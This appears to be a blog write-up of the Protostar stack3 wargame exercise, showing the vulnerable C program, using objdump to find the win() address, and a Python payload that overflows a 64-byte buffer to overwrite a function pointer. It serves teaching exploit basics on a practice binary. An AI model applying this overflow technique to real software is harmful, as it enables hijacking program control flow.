---
layout: post
title: "Redirecting Code To Specific Address: protostar stack3"
date: 2018-10-23 16:02:45 -700
categories: jekyll update
---
{% highlight c %}
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
{% endhighlight %}

Here we have a function outside of the main() called win() and in the main we have a blank function pointer within main, conveniently located right after the end of a buffer. 

If you are not familiar with how a c program runs, the code contained in the main() will be executed, and other functions outside of it are typically called within main. Since the function win() is never called by main(), it will never execute. Unless you are a hacker. 

The basic idea is the same for this program, we will overflow the buffer and write whatever we want to the fp() pointer. In this case, we need to write the address of the win() function.

There are many ways to get the address of the main function including using a debugger like GDB (a tool I use a lot), but for the sake of simplicity, I will show how to find this address using a command called objdump.

objdump has many uses, but for our purpose we should run it with the -S flag, in order to get the source, which will contain memory addresses of functions. We can also use grep to give us only the win() address.

$objdump -S stack3 | grep win

08048424 <win>:

$

Now we have the address.

$python -c 'print "A"*64 + "\x24\x84\x04\x08"' | ./stack3

calling function at 0x08048424
code flow successfully changed

Cool. We have changed the code flow to a specific part of memory. This is a very useful tactic, which will be expanded upon in later challenges. 